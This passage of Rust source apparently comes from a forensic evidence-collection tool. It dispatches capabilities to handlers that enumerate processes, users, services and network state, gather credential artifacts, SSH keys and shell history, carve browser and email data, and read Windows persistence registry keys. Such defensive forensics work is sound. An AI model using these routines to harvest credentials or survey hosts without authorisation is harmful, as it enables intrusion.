            | "process.executable_path"
            | "process.cwd"
            | "process.start_time"
            | "process.user"
            | "process.group"
            | "process.state"
            | "process.memory.rss"
            | "process.memory.vms"
            | "process.threads"
            | "process.handles"
            | "process.session"
            | "process.terminal"
            | "process.priority"
            | "process.nice"
            | "process.env"
            | "process.cgroup"
            | "process.container"
            | "process.open.files"
            | "process.network.connections"
            | "process.hash"
            | "process.integrity" => Some("process.enumerate"),
            "process.parent.name" | "process.child.pids" | "process.tree" => Some("process.tree"),
            "process.module.list"
            | "process.module.path"
            | "process.module.version"
            | "process.module.signature" => Some("process.modules"),
            "process.memory.map" => Some("process.memory"),
            "process.deleted.exe" => Some("process.deleted_exe"),
            "user.list"
            | "user.sid"
            | "user.home"
            | "user.shell"
            | "user.group.membership"
            | "user.last.login"
            | "user.status"
            | "user.admin"
            | "user.service.accounts" => Some("user.enumerate"),
            "auth.logon.events"
            | "auth.successful.logins"
            | "auth.failed.logins"
            | "auth.remote.sessions"
            | "auth.windows.logon" => Some("auth.logon_events"),
            "auth.password.policy"
            | "auth.ssh.config"
            | "auth.ssh.authorized.keys"
            | "auth.ssh.known.hosts"
            | "auth.sudoers"
            | "auth.pam" => Some("auth.policy"),
            "service.list"
            | "service.name"
            | "service.state"
            | "service.binary.path"
            | "service.account"
            | "service.dependencies"
            | "service.start.mode" => Some("service.enumerate"),
            "service.driver.list" => Some("service.drivers"),
            "service.systemd.units" => Some("service.systemd"),
            "network.interfaces"
            | "network.interface.addresses"
            | "network.mac"
            | "network.routes"
            | "network.arp"
            | "network.dns.servers"
            | "network.dns.cache"
            | "network.hosts"
            | "network.connections.active"
            | "network.listening.ports"
            | "network.tcp"
            | "network.udp"
            | "network.process.relationships"
            | "network.proxy"
            | "network.vpn"
            | "network.firewall.policy"
            | "network.shares"
            | "network.listeners" => Some("network.connections"),
            "filesystem.enumerate"
            | "filesystem.path"
            | "filesystem.size"
            | "filesystem.timestamps"
            | "filesystem.permissions"
            | "filesystem.owner"
            | "filesystem.type"
            | "filesystem.hidden"
            | "filesystem.links"
            | "filesystem.executable"
            | "filesystem.hash.sha256"
            | "filesystem.hash.sha1"
            | "filesystem.hash.md5"
            | "filesystem.recent"
            | "filesystem.mounts"
            | "filesystem.alternate.data.streams"
            | "filesystem.deleted.open" => Some("filesystem.enumerate"),
            "artifact.shell.history"
            | "artifact.bash.history"
            | "artifact.zsh.history"
            | "artifact.cron"
            | "artifact.systemd"
            | "artifact.ssh"
            | "artifact.auth.logs"
            | "artifact.journal"
            | "artifact.auditd"
            | "artifact.sudo"
            | "artifact.login.config" => Some("artifact.shell_history"),
            "persistence.run"
            | "persistence.startup.folder"
            | "persistence.scheduled.task"
            | "persistence.cron"
            | "persistence.systemd.timer"
            | "persistence.shell.profile"
            | "persistence.wmi"
            | "persistence.ssh"
            | "persistence.winlogon"
            | "persistence.ifeo"
            | "persistence.appinit" => Some("persistence.autostart"),
            "kernel.modules"
            | "kernel.module.paths"
            | "kernel.module.params"
            | "kernel.module.version"
            | "kernel.module.signatures"
            | "kernel.module.hashes" => Some("kernel.modules"),
            "security.audit.policy" => Some("security.audit_policy"),
            "security.antivirus" | "security.update.state" => Some("security.av_status"),
            "security.firewall" => Some("security.firewall"),
            "security.selinux" | "security.apparmor" | "security.policy" => {
                Some("security.app_control")
            }
            "evidence.sha256" => Some("evidence.sha256"),
            "evidence.merkle" => Some("evidence.merkle"),
            "evidence.provenance" => Some("evidence.provenance"),
            "evidence.origin" => Some("evidence.origin"),
            "evidence.collector.status" => Some("evidence.collector.status"),
            _ => None,
        }
    }

    /// Return the authoritative runtime binding for a capability, if one exists.
    pub fn runtime_binding_for(&self, capability_id: &str) -> Option<&RuntimeCapabilityBinding> {
        if let Some(binding) = self.runtime_dispatch.get(capability_id) {
            return Some(binding);
        }
        let alias = self.runtime_dispatch_alias(capability_id)?;
        self.runtime_dispatch.get(alias)
    }

    /// Check whether a capability is backed by a runtime implementation.
    pub fn runtime_capability_exists(&self, capability_id: &str) -> bool {
        self.runtime_binding_for(capability_id).is_some()
    }

    /// Return the truth status of a capability without conflating declaration with runtime reachability.
    pub fn capability_truth_status(&self, capability_id: &str) -> CapabilityTruthStatus {
        let Some(_) = self.capabilities.get(capability_id) else {
            return CapabilityTruthStatus::Unknown;
        };
        if self.runtime_binding_for(capability_id).is_some() {
            CapabilityTruthStatus::RuntimeBound
        } else {
            CapabilityTruthStatus::DeclaredOnly
        }
    }

    /// Invoke the runtime-backed collector contract for a capability.
    /// This executes the real collector and produces evidence through the canonical pipeline.
    pub fn invoke_runtime_capability(
        &self,
        capability_id: &str,
    ) -> Result<CapabilityExecutionResult, String> {
        self.invoke_runtime_capability_with_options(capability_id, &serde_json::Map::new())
    }

    /// Invoke a runtime-backed collector with the options preserved by the compiler pipeline.
    pub fn invoke_runtime_capability_with_options(
        &self,
        capability_id: &str,
        options: &serde_json::Map<String, serde_json::Value>,
    ) -> Result<CapabilityExecutionResult, String> {
        let start_time = std::time::Instant::now();

        let capability = self
            .capabilities
            .get(capability_id)
            .ok_or_else(|| format!("Capability '{}' not found in registry", capability_id))?;

        let binding = self.runtime_binding_for(capability_id).ok_or_else(|| {
            format!(
                "Capability '{}' is declared but not runtime-bound",
                capability_id
            )
        })?;

        // Platform validation
        let current_platform = if cfg!(target_os = "linux") {
            Platform::Linux
        } else if cfg!(target_os = "windows") {
            Platform::Windows
        } else {
            Platform::Both
        };

        if binding.platform != Platform::Both && binding.platform != current_platform {
            return Ok(CapabilityExecutionResult::unsupported(
                capability.id.clone(),
                capability.name.clone(),
                binding.runtime_handler.to_string(),
                binding.runtime_module.to_string(),
                format!("{:?}", binding.platform),
                format!("{:?}", binding.privilege),
                binding.evidence_contract.to_string(),
                start_time.elapsed().as_millis() as u64,
            ));
        }

        // Privilege validation against host environment
        let is_elevated_process = {
            #[cfg(target_os = "windows")]
            {
                std::process::Command::new("net")
                    .args(["session"])
                    .output()
                    .map(|o| o.status.success())
                    .unwrap_or(false)
            }
            #[cfg(target_os = "linux")]
            {
                unsafe { libc::geteuid() == 0 }
            }
            #[cfg(not(any(target_os = "windows", target_os = "linux")))]
            {
                false
            }
        };

        if (binding.privilege == PrivilegeLevel::Admin || binding.privilege == PrivilegeLevel::Kernel) && !is_elevated_process {
            eprintln!(
                "[WARN] Capability '{}' requires {:?} privileges; running with current user privileges",
                capability.id, binding.privilege
            );
        }

        // Create evidence collector
        let mut collector = EvidenceCollector::new(&format!("capability-{}", capability_id));
        collector.set_evidence_origin(EvidenceOrigin::Real);

        // Execute the appropriate handler based on the runtime binding
        let result = self.execute_handler(&mut collector, capability, binding, options);

        let execution_time_ms = start_time.elapsed().as_millis() as u64;

        match result {
            Ok((status, records_count, mut evidence_records, error, warning)) => {
                let provenance = serde_json::json!({
                    "capability_id": capability.id,
                    "collector": binding.runtime_handler,
                    "host": collector.host_identifier(),
                    "platform": format!("{:?}", current_platform),
                    "collected_at": chrono::Utc::now(),
                    "status": match status {
                        CollectionStatus::Success => "SUCCESS",
                        CollectionStatus::Partial => "PARTIAL",
                        CollectionStatus::Failed => "FAILED",
                        CollectionStatus::NotFound => "NOT_FOUND",
                        CollectionStatus::Unsupported => "UNSUPPORTED",
                        CollectionStatus::PermissionDenied => "PERMISSION_DENIED",
                        CollectionStatus::RequiresElevation => "REQUIRES_ELEVATION",
                    },
                    "origin": "REAL",
                });
                for record in &mut evidence_records {
                    if let Some(fields) = record.as_object_mut() {
                        fields.insert("_provenance".to_string(), provenance.clone());
                    } else {
                        *record = serde_json::json!({
                            "data": record,
                            "_provenance": provenance.clone(),
                        });
                    }
                }
                collector.set_records(evidence_records.clone());
                Ok(CapabilityExecutionResult {
                    capability_id: capability.id.clone(),
                    capability_name: capability.name.clone(),
                    handler: binding.runtime_handler.to_string(),
                    runtime_module: binding.runtime_module.to_string(),
                    platform: format!("{:?}", current_platform),
                    privilege: format!("{:?}", binding.privilege),
                    evidence_contract: binding.evidence_contract.to_string(),
                    status,
                    records_count,
                    error,
                    warning,
                    evidence_records,
                    execution_time_ms,
                })
            }
            Err(e) => {
                let error = e.to_lowercase();
                let args = (
                    capability.id.clone(),
                    capability.name.clone(),
                    binding.runtime_handler.to_string(),
                    binding.runtime_module.to_string(),
                    format!("{:?}", current_platform),
                    format!("{:?}", binding.privilege),
                    binding.evidence_contract.to_string(),
                );
                if error.contains("permission denied") || error.contains("operation not permitted")
                {
                    Ok(CapabilityExecutionResult::permission_denied(
                        args.0,
                        args.1,
                        args.2,
                        args.3,
                        args.4,
                        args.5,
                        args.6,
                        execution_time_ms,
                    ))
                } else if error.contains("not found") || error.contains("no such file") {
                    Ok(CapabilityExecutionResult::not_found(
                        args.0,
                        args.1,
                        args.2,
                        args.3,
                        args.4,
                        args.5,
                        args.6,
                        execution_time_ms,
                    ))
                } else if error.contains("unsupported") || error.contains("not supported") {
                    Ok(CapabilityExecutionResult::unsupported(
                        args.0,
                        args.1,
                        args.2,
                        args.3,
                        args.4,
                        args.5,
                        args.6,
                        execution_time_ms,
                    ))
                } else {
                    Ok(CapabilityExecutionResult::failed(
                        args.0,
                        args.1,
                        args.2,
                        args.3,
                        args.4,
                        args.5,
                        args.6,
                        e,
                        execution_time_ms,
                    ))
                }
            }
        }
    }

    /// Execute the actual runtime handler for a capability
    fn execute_handler(
        &self,
        collector: &mut EvidenceCollector,
        capability: &Capability,
        binding: &RuntimeCapabilityBinding,
        options: &serde_json::Map<String, serde_json::Value>,
    ) -> Result<
        (
            CollectionStatus,
            usize,
            Vec<serde_json::Value>,
            Option<String>,
            Option<String>,
        ),
        String,
    > {
        let handler = binding.runtime_handler;
        let option_string = |key: &str, default: &str| {
            options
                .get(key)
                .and_then(serde_json::Value::as_str)
                .unwrap_or(default)
                .to_string()
        };
        let fields = options
            .get("fields")
            .and_then(serde_json::Value::as_array)
            .map(|values| {
                values
                    .iter()
                    .filter_map(serde_json::Value::as_str)
                    .map(str::to_owned)
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();

        macro_rules! append_records {
            ($records:expr) => {{
                let records: Vec<serde_json::Value> = $records;
                let count = records.len();
                collector.data_mut().extend(records.iter().cloned());
                let marker_status = records
                    .iter()
                    .filter_map(|record| record.get("status").and_then(serde_json::Value::as_str))
                    .map(str::to_ascii_lowercase)
                    .find(|status| {
                        matches!(
                            status.as_str(),
                            "not_implemented"
                                | "unsupported"
                                | "platform_note"
                                | "path_not_found"
                                | "not_found"
                                | "no_paths_found"
                                | "not_available"
                                | "unavailable"
                                | "unknown_type"
                                | "permission_denied"
                                | "requires_elevation"
                                | "partial"
                                | "failed"
                                | "parse_error"
                                | "read_error"
                        )
                    });
                let status = match marker_status.as_deref() {
                    Some("not_implemented" | "unsupported" | "platform_note") => {
                        CollectionStatus::Unsupported
                    }
                    Some("unavailable" | "unknown_type") => CollectionStatus::Unsupported,
                    Some("path_not_found" | "not_found" | "no_paths_found" | "not_available") => {
                        CollectionStatus::NotFound
                    }
                    Some("permission_denied") => CollectionStatus::PermissionDenied,
                    Some("requires_elevation") => CollectionStatus::RequiresElevation,
                    Some("partial" | "parse_error" | "read_error") => CollectionStatus::Partial,
                    Some("failed") => CollectionStatus::Failed,
                    _ => CollectionStatus::Success,
                };
                let warning = (status == CollectionStatus::Partial
                    || status == CollectionStatus::Unsupported
                    || status == CollectionStatus::RequiresElevation)
                    .then(|| {
                        format!(
                            "Collector returned status {}",
                            marker_status.as_deref().unwrap_or("unknown")
                        )
                    });
                Ok((status, count, records, None, warning))
            }};
        }

        macro_rules! append_records_with_errors {
            ($records:expr, $errors:expr) => {{
                let records: Vec<serde_json::Value> = $records;
                let errors: Vec<String> = $errors;
                let count = records.len();
                collector.data_mut().extend(records.iter().cloned());
                let warning = (!errors.is_empty()).then(|| errors.join("; "));
                let status = if warning.is_some() {
                    CollectionStatus::Partial
                } else {
                    CollectionStatus::Success
                };
                Ok((status, count, records, None, warning))
            }};
        }

        match handler {
            // System info handlers
            "collect_system_info" => {
                collector.collect_system_info().map_err(|e| e.to_string())?;
                let records = collector.data().to_vec();
                let count = records.len();
                Ok((CollectionStatus::Success, count, records, None, None))
            }
            "collect_system_info_detailed" => {
                let record = jockey_runtime_system::collect_system_info_detailed()
                    .map_err(|e| e.to_string())?;
                append_records!(vec![record])
            }

            // Process handlers
            "enumerate_processes" => {
                collector
                    .collect_processes(fields)
                    .map_err(|e| e.to_string())?;
                let records = collector.data().to_vec();
                let count = records.len();
                Ok((CollectionStatus::Success, count, records, None, None))
            }
            "collect_process_tree" => {
                let records =
                    jockey_runtime_process::collect_process_tree().map_err(|e| e.to_string())?;
                append_records!(records)
            }
            "collect_process_modules" => {
                let processes =
                    jockey_runtime_process::enumerate_processes(&[]).map_err(|e| e.to_string())?;
                let mut modules = Vec::new();
                for process in processes {
                    let Some(pid) = process.get("pid").and_then(serde_json::Value::as_i64) else {
                        continue;
                    };
                    if let Some(process_modules) =
                        process.get("modules").and_then(serde_json::Value::as_array)
                    {
                        for module in process_modules {
                            let mut module = module.clone();
                            if let Some(fields) = module.as_object_mut() {
                                fields.insert("pid".to_string(), serde_json::json!(pid));
                            }
                            modules.push(module);
                        }
                    }
                }
                append_records!(modules)
            }
            "collect_process_handles" => {
                let processes =
                    jockey_runtime_process::enumerate_processes(&[]).map_err(|e| e.to_string())?;
                let records = processes.into_iter().filter_map(|process| {
                    let pid = process.get("pid")?.as_i64()?;
                    let open_files = process.get("open_files")?.as_array()?;
                    Some(serde_json::json!({
                        "pid": pid,
                        "open_files": open_files,
                        "source": if cfg!(target_os = "linux") { "/proc/<pid>/fd" } else { "process collector" },
                    }))
                }).collect();
                append_records!(records)
            }
            "enumerate_memory_regions" => {
                let pid_filter = options
                    .get("pid")
                    .and_then(serde_json::Value::as_i64)
                    .map(|pid| pid as i32);
                collector
                    .collect_memory_regions(pid_filter)
                    .map_err(|e| e.to_string())?;
                append_records!(collector.data().to_vec())
            }

            // User handlers
            "enumerate_users" => {
                let result = jockey_runtime_users::enumerate_users().map_err(|e| e.to_string())?;
                let mut records = Vec::new();
                for user in result.users {
                    records.push(serde_json::json!({
                        "record_type": "user",
                        "data": serde_json::to_value(user).map_err(|e| e.to_string())?,
                    }));
                }
                for group in result.groups {
                    records.push(serde_json::json!({
                        "record_type": "group",
                        "data": serde_json::to_value(group).map_err(|e| e.to_string())?,
                    }));
                }
                append_records_with_errors!(records, result.errors)
            }

            // Auth handlers
            "collect_logon_events" => {
                let result =
                    jockey_runtime_auth::collect_logon_events().map_err(|e| e.to_string())?;
                let errors = result.errors;
                let records = result
                    .events
                    .into_iter()
                    .map(|event| serde_json::to_value(event).map_err(|e| e.to_string()))
                    .collect::<Result<Vec<_>, _>>()?;
                append_records_with_errors!(records, errors)
            }
            "collect_credential_artifacts" => {
                let result = jockey_runtime_auth::collect_credential_artifacts()
                    .map_err(|e| e.to_string())?;
                let errors = result.errors;
                let records = result
                    .artifacts
                    .into_iter()
                    .map(|artifact| serde_json::to_value(artifact).map_err(|e| e.to_string()))
                    .collect::<Result<Vec<_>, _>>()?;
                append_records_with_errors!(records, errors)
            }
            "collect_auth_policy" => {
                let result =
                    jockey_runtime_auth::collect_auth_policy().map_err(|e| e.to_string())?;
                let errors = result.errors;
                let records = result
                    .policies
                    .into_iter()
                    .map(|policy| serde_json::to_value(policy).map_err(|e| e.to_string()))
                    .collect::<Result<Vec<_>, _>>()?;
                append_records_with_errors!(records, errors)
            }

            // Service handlers
            "enumerate_services" => {
                let result =
                    jockey_runtime_services::enumerate_services().map_err(|e| e.to_string())?;
                let errors = result.errors;
                let records = result
                    .services
                    .into_iter()
                    .map(|service| serde_json::to_value(service).map_err(|e| e.to_string()))
                    .collect::<Result<Vec<_>, _>>()?;
                append_records_with_errors!(records, errors)
            }
            "enumerate_drivers" => {
                collector.collect_drivers().map_err(|e| e.to_string())?;
                let records = collector.data().to_vec();
                let count = records.len();
                Ok((CollectionStatus::Success, count, records, None, None))
            }
            "enumerate_systemd_units" => {
                let units = jockey_runtime_services::enumerate_systemd_units()
                    .map_err(|e| e.to_string())?;
                let records = units
                    .into_iter()
                    .map(|unit| serde_json::to_value(unit).map_err(|e| e.to_string()))
                    .collect::<Result<Vec<_>, _>>()?;
                append_records!(records)
            }

            // Network handlers
            "enumerate_connections" => {
                collector
                    .collect_network_connections()
                    .map_err(|e| e.to_string())?;
                let records = collector.data().to_vec();
                let count = records.len();
                Ok((CollectionStatus::Success, count, records, None, None))
            }
            "enumerate_interfaces" => append_records!(
                jockey_runtime_network::enumerate_interfaces().map_err(|e| e.to_string())?
            ),
            "enumerate_routes" => append_records!(
                jockey_runtime_network::enumerate_routes().map_err(|e| e.to_string())?
            ),
            "enumerate_arp" => {
                append_records!(jockey_runtime_network::enumerate_arp().map_err(|e| e.to_string())?)
            }
            "enumerate_dns_servers" => append_records!(
                jockey_runtime_network::enumerate_dns_servers().map_err(|e| e.to_string())?
            ),
            "enumerate_dns_cache" => append_records!(
                jockey_runtime_network::enumerate_dns_cache().map_err(|e| e.to_string())?
            ),
            "enumerate_hosts" => append_records!(
                jockey_runtime_network::enumerate_hosts().map_err(|e| e.to_string())?
            ),
            "enumerate_listening_ports" => {
                append_records!(jockey_runtime_network::enumerate_listening_ports()
                    .map_err(|e| e.to_string())?)
            }
            "enumerate_firewall_policy" => {
                append_records!(jockey_runtime_network::enumerate_firewall_policy()
                    .map_err(|e| e.to_string())?)
            }
            "enumerate_shares" => append_records!(
                jockey_runtime_network::enumerate_shares().map_err(|e| e.to_string())?
            ),
            "enumerate_listeners" => append_records!(
                jockey_runtime_network::enumerate_listeners().map_err(|e| e.to_string())?
            ),

            // Filesystem handlers
            "enumerate_files" => {
                let path = option_string("path", ".");
                let recursive = options
                    .get("recursive")
                    .and_then(serde_json::Value::as_bool)
                    .unwrap_or(false);
                let default_hash = match capability.id.as_str() {
                    "filesystem.hash.sha256" => "sha256",
                    "filesystem.hash.sha1" => "sha1",
                    "filesystem.hash.md5" => "md5",
                    _ => "none",
                };
                collector
                    .collect_files(&path, recursive, &option_string("hash", default_hash))
                    .map_err(|e| e.to_string())?;
                let records = collector.data().to_vec();
                let count = records.len();
                Ok((CollectionStatus::Success, count, records, None, None))
            }
            "enumerate_mounts" => {
                let records = jockey_runtime_filesystem::enumerate_mounts()
                    .map_err(|e| e.to_string())?;
                append_records!(records)
            }
            "detect_alternate_data_streams" => {
                let path = option_string("path", ".");
                let records = jockey_runtime_filesystem::detect_alternate_data_streams(&path)
                    .map_err(|e| e.to_string())?;
                append_records!(records)
            }

            // Artifact handlers
            "carve_shell_history" => {
                append_records!(jockey_runtime_artifacts::carve_shell_history("/home")
                    .map_err(|e| e.to_string())?)
            }
            "carve_cron_entries" => append_records!(jockey_runtime_artifacts::carve_cron_entries(
                ""
            )
            .map_err(|e| e.to_string())?),
            "carve_systemd_units" => append_records!(
                jockey_runtime_artifacts::carve_systemd_units("").map_err(|e| e.to_string())?
            ),
            "carve_ssh_config" => {
                append_records!(jockey_runtime_artifacts::carve_ssh_config("/etc/ssh")
                    .map_err(|e| e.to_string())?)
            }
            "carve_prefetch" => append_records!(jockey_runtime_artifacts::carve_prefetch(
                r"C:\Windows\Prefetch"
            )
            .map_err(|e| e.to_string())?),
            "carve_lnk_files" => {
                let recent = std::env::var("APPDATA")
                    .map(|path| format!(r"{}\Microsoft\Windows\Recent", path))
                    .unwrap_or_else(|_| {
                        r"C:\Users\Default\AppData\Roaming\Microsoft\Windows\Recent".to_string()
                    });
                append_records!(
                    jockey_runtime_artifacts::carve_lnk_files(&recent).map_err(|e| e.to_string())?
                )
            }
            "carve_recycle_bin" => append_records!(jockey_runtime_artifacts::carve_recycle_bin(
                r"C:\$RECYCLE.BIN"
            )
            .map_err(|e| e.to_string())?),
            "carve_shellbags" => append_records!(
                jockey_runtime_artifacts::carve_shellbags(".").map_err(|e| e.to_string())?
            ),
            "carve_jumplists" => {
                let recent = std::env::var("APPDATA")
                    .map(|path| format!(r"{}\Microsoft\Windows\Recent\AutomaticDestinations", path))
                    .unwrap_or_else(|_| r"C:\Users\Default\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations".to_string());
                append_records!(
                    jockey_runtime_artifacts::carve_jumplists(&recent).map_err(|e| e.to_string())?
                )
            }
            "carve_amcache" => append_records!(jockey_runtime_artifacts::carve_amcache(
                r"C:\Windows\AppCompat\Programs\Amcache.hve"
            )
            .map_err(|e| e.to_string())?),
            "carve_srum" => append_records!(jockey_runtime_artifacts::carve_srum(
                r"C:\Windows\System32\sru\SRUDB.dat"
            )
            .map_err(|e| e.to_string())?),
            "collect_etw_logs" => append_records!(
                jockey_runtime_artifacts::collect_etw_logs(".").map_err(|e| e.to_string())?
            ),
            "carve_event_logs" => append_records!(jockey_runtime_artifacts::carve_event_logs(
                r"C:\Windows\System32\winevt\Logs"
            )
            .map_err(|e| e.to_string())?),
            "carve_recent_files" => {
                let recent = std::env::var("APPDATA")
                    .map(|path| format!(r"{}\Microsoft\Windows\Recent", path))
                    .unwrap_or_else(|_| {
                        r"C:\Users\Default\AppData\Roaming\Microsoft\Windows\Recent".to_string()
                    });
                append_records!(jockey_runtime_artifacts::carve_recent_files(&recent)
                    .map_err(|e| e.to_string())?)
            }
            "carve_container_artifacts" => append_records!(
                jockey_runtime_artifacts::carve_container_artifacts("/var/lib")
                    .map_err(|e| e.to_string())?
            ),
            "carve_browser_artifacts" => append_records!(
                jockey_runtime_artifacts::carve_browser_artifacts(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "carve_email_artifacts" => append_records!(
                jockey_runtime_artifacts::carve_email_artifacts(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "carve_office_artifacts" => append_records!(
                jockey_runtime_artifacts::carve_office_artifacts(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "analyze_powershell_scripts" => append_records!(
                jockey_runtime_artifacts::analyze_powershell_scripts(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "analyze_wmi_scripts" => append_records!(
                jockey_runtime_artifacts::analyze_wmi_scripts(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "analyze_shell_scripts" => append_records!(
                jockey_runtime_artifacts::analyze_shell_scripts(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "analyze_python_scripts" => append_records!(
                jockey_runtime_artifacts::analyze_python_scripts(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "analyze_javascript_scripts" => append_records!(
                jockey_runtime_artifacts::analyze_javascript_scripts(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "analyze_batch_scripts" => append_records!(
                jockey_runtime_artifacts::analyze_batch_scripts(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "analyze_all_scripts" => {
                let records =
                    jockey_runtime_artifacts::analyze_all_script_files(&option_string("path", "."))
                        .map_err(|e| e.to_string())?;
                let (field, behavior) = match capability.id.as_str() {
                    "script.url.indicators" => (Some("urls"), None),
                    "script.ip.indicators" => (Some("ip_addresses"), None),
                    "script.file.indicators" => (Some("file_or_registry_paths"), None),
                    "script.environment.indicators" => (Some("environment_variables"), None),
                    "script.obfuscation" => (Some("encoded_strings"), Some("obfuscation")),
                    "script.execution" => (None, Some("execution")),
                    "script.persistence" => (None, Some("persistence")),
                    _ => return Err(format!("No indicator projection for {}", capability.id)),
                };
                let projected = records
                    .into_iter()
                    .filter_map(|record| {
                        let analysis = record.get("static_analysis")?;
                        let values = if let Some(field) = field {
                            analysis.get(field)?.as_array()?.clone()
                        } else {
                            let matches = analysis.get("behavior_indicators")?.as_array()?;
                            if !matches.iter().any(|value| value.as_str() == behavior) {
                                return None;
                            }
                            matches.clone()
                        };
                        if values.is_empty() {
                            return None;
                        }
                        Some(serde_json::json!({
                            "artifact_type": record.get("artifact_type"),
                            "path": record.get("path"),
                            "sha256": record.get("sha256"),
                            "indicator_type": capability.id,
                            "indicators": values,
                        }))
                    })
                    .collect::<Vec<_>>();
                append_records!(projected)
            }
            "parse_pe_metadata" => append_records!(jockey_runtime_artifacts::parse_pe_metadata(
                &option_string("path", ".")
            )
            .map_err(|e| e.to_string())?),
            "parse_elf_metadata" => append_records!(jockey_runtime_artifacts::parse_elf_metadata(
                &option_string("path", ".")
            )
            .map_err(|e| e.to_string())?),
            "verify_code_signature" => append_records!(
                jockey_runtime_artifacts::verify_code_signature(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "analyze_file_entropy" => append_records!(
                jockey_runtime_artifacts::analyze_file_entropy(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "detect_binary_anomalies" => append_records!(
                jockey_runtime_artifacts::detect_binary_anomalies(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "detect_rootkit_indicators" => append_records!(
                jockey_runtime_security::detect_rootkit_indicators(&option_string("path", "."))
                    .map_err(|e| e.to_string())?
            ),
            "enumerate_scheduled_tasks" => {
                append_records!(jockey_runtime_artifacts::collect_windows_scheduled_tasks()
                    .map_err(|e| e.to_string())?)
            }
            "enumerate_wmi_subscriptions" => append_records!(
                jockey_runtime_artifacts::collect_windows_wmi_subscriptions()
                    .map_err(|e| e.to_string())?
            ),
            "hash_sha256" => {
                if capability.id.starts_with("file.") {
                    let path = option_string("path", "");
                    if path.is_empty() {
                        return Err("A file path is required for file SHA-256 hashing".to_string());
                    }
                    let sha256 = jockey_runtime_filesystem::calculate_hash(&path, "sha256")
                        .map_err(|e| e.to_string())?;
                    append_records!(vec![serde_json::json!({
                        "path": path,
                        "sha256": sha256,
                        "hash_algorithm": "sha256",
                    })])
                } else {
                    let source_records = options
                        .get("_evidence_records")
                        .and_then(serde_json::Value::as_array)
                        .cloned()
                        .unwrap_or_default();
                    let mut evidence = EvidenceCollector::new("capability-evidence-hash");
                    evidence.set_records(source_records.clone());
                    let sha256 = evidence.compute_hash("sha256").map_err(|e| e.to_string())?;
                    append_records!(vec![serde_json::json!({
                        "evidence_sha256": sha256,
                        "record_count": source_records.len(),
                    })])
                }
            }
            "collect_logs" => {
                let source = match capability.id.as_str() {
                    "artifact.auth.logs" => "auth",
                    "artifact.journal" => "journal",
                    "artifact.auditd" => "audit",
                    "artifact.sudo" => "sudo",
                    "artifact.login.config" => "login",
                    _ => {
                        return Err(format!(
                            "No log source mapping for capability {}",
                            capability.id
                        ))
                    }
                };
                collector.collect_logs(source).map_err(|e| e.to_string())?;
                append_records!(collector.data().to_vec())
            }
            "collect_autostart_entries" => {
                if matches!(
                    capability.id.as_str(),
                    "persistence.run"
                        | "persistence.winlogon"
                        | "persistence.ifeo"
                        | "persistence.appinit"
                ) {
                    if !cfg!(target_os = "windows") {
                        return Err(format!("Unsupported platform for {}", capability.id));
                    }
                    let keys: Vec<(&str, &str)> = match capability.id.as_str() {
                        "persistence.run" => vec![
                            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"),
                            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                            ("HKLM", r"Software\Microsoft\Windows\CurrentVersion\Run"),
                            ("HKLM", r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                        ],
                        "persistence.winlogon" => vec![(
                            "HKLM",
                            r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
                        )],
                        "persistence.ifeo" => vec![(
                            "HKLM",
                            r"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
                        )],
                        "persistence.appinit" => vec![(
                            "HKLM",
                            r"Software\Microsoft\Windows NT\CurrentVersion\Windows",
                        )],
                        _ => unreachable!(),
                    };
                    let mut failed = false;
                    for (hive, key) in keys {
                        if collector.collect_registry(hive, key).is_err() {
                            failed = true;
                        }
                    }
                    let records = collector.data().to_vec();
                    if failed && records.is_empty() {
                        return Err("Permission denied or registry key unavailable".to_string());
                    }
                    let count = records.len();
                    let status = if failed {
                        CollectionStatus::Partial
                    } else {
                        CollectionStatus::Success
                    };
                    let warning =
                        failed.then(|| "One or more registry keys could not be read".to_string());
                    return Ok((status, count, records, None, warning));
                }
                let records = match capability.id.as_str() {
                    "persistence.autostart" => {
                        jockey_runtime_artifacts::collect_autostart_entries(None)
                    }
                    "persistence.cron" => jockey_runtime_artifacts::carve_cron_entries(""),
                    "persistence.systemd.timer" => {
                        jockey_runtime_artifacts::carve_systemd_units("").map(|units| {
                            units
                                .into_iter()
                                .filter(|unit| {
                                    unit.get("metadata")
                                        .and_then(|m| m.get("unit_type"))
                                        .and_then(serde_json::Value::as_str)
                                        == Some("timer")
                                })
                                .collect()
                        })
                    }
                    "persistence.ssh" => jockey_runtime_artifacts::carve_ssh_config("/etc/ssh"),
                    "persistence.shell.profile" => {
                        jockey_runtime_artifacts::collect_shell_profiles(None)
                    }
                    "persistence.startup.folder" if cfg!(target_os = "linux") => {
                        jockey_runtime_artifacts::collect_xdg_autostart_entries(None)
                    }
                    "persistence.startup.folder" if cfg!(target_os = "windows") => {
                        let mut startup_records = Vec::new();
                        for directory in [
                            std::env::var("APPDATA").ok().map(|root| {
                                format!(r"{}\Microsoft\Windows\Start Menu\Programs\Startup", root)
                            }),
                            std::env::var("PROGRAMDATA").ok().map(|root| {
                                format!(r"{}\Microsoft\Windows\Start Menu\Programs\Startup", root)
                            }),
                        ]
                        .into_iter()
                        .flatten()
                        {
                            startup_records.extend(
                                jockey_runtime_artifacts::carve_lnk_files(&directory)
                                    .map_err(|e| e.to_string())?,
                            );
                        }
                        Ok(startup_records)
                    }
                    "persistence.scheduled.task" | "persistence.scheduled_tasks"
                        if cfg!(target_os = "linux") =>
                    {
                        jockey_runtime_artifacts::carve_cron_entries("")
                    }
                    "persistence.scheduled.task" | "persistence.scheduled_tasks"
